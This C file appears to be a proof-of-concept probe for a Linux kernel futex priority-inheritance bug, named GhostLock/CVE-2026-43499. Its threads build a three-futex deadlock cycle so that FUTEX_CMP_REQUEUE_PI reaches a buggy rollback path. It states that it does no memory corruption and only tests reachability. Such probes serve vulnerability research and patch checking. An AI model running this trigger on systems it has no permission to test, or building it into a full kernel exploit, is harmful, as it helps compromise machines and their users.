/* trigger.c - GhostLock/CVE-2026-43499 trigger-only probe.
 * Builds the 3-futex PI deadlock cycle and issues FUTEX_CMP_REQUEUE_PI so the
 * kernel takes the buggy remove_waiter() rollback (returns -EDEADLK).
 * No memory corruption / no reclaim: safe reachability probe only. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <time.h>

#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_LOCK_PI         6
#define FUTEX_UNLOCK_PI       7
#endif

static volatile uint32_t f_wait, f_pi_target, f_pi_chain;
static volatile int waiter_ready, waiter_waiting, owner_started;

static long futex_op(uint32_t *uaddr, int op, uint32_t val,
                     void *timeout, uint32_t *uaddr2, uint32_t val3)
{
    return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

static void *waiter_thread(void *arg)
{
    (void)arg;
    if (futex_op((uint32_t *)&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
        fprintf(stderr, "waiter: LOCK_PI(chain) errno=%d\n", errno);
    __atomic_store_n(&waiter_ready, 1, __ATOMIC_SEQ_CST);
    while (!__atomic_load_n(&owner_started, __ATOMIC_SEQ_CST)) usleep(1000);

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 5;

    __atomic_store_n(&waiter_waiting, 1, __ATOMIC_SEQ_CST);
    errno = 0;
    long r = futex_op((uint32_t *)&f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
                      &ts, (uint32_t *)&f_pi_target, 0);
    printf("waiter: WAIT_REQUEUE_PI ret=%ld errno=%d (%s)\n",
           r, errno, strerror(errno));
    return NULL;
}

static void *owner_thread(void *arg)
{
    (void)arg;
    if (futex_op((uint32_t *)&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
        fprintf(stderr, "owner: LOCK_PI(target) errno=%d\n", errno);
    while (!__atomic_load_n(&waiter_ready, __ATOMIC_SEQ_CST)) usleep(1000);
    __atomic_store_n(&owner_started, 1, __ATOMIC_SEQ_CST);
    /* blocks on chain (held by waiter) -> forms the cycle */
    futex_op((uint32_t *)&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[trigger] stdin pid=%d\n", (int)syscall(SYS_gettid));

    pthread_t w, o;
    pthread_create(&w, NULL, waiter_thread, NULL);
    pthread_create(&o, NULL, owner_thread, NULL);

    while (!__atomic_load_n(&waiter_waiting, __ATOMIC_SEQ_CST) ||
           !__atomic_load_n(&owner_started, __ATOMIC_SEQ_CST))
        usleep(1000);
    usleep(100000);

    errno = 0;
    long r = futex_op((uint32_t *)&f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                      (void *)1, (uint32_t *)&f_pi_target, 0);
    int e = errno;
    printf("[trigger] CMP_REQUEUE_PI ret=%ld errno=%d (%s)  %s\n",
           r, e, strerror(e), (e == EDEADLK) ? "<<< EDEADLK: buggy path reached" : "");
    return 0;
}
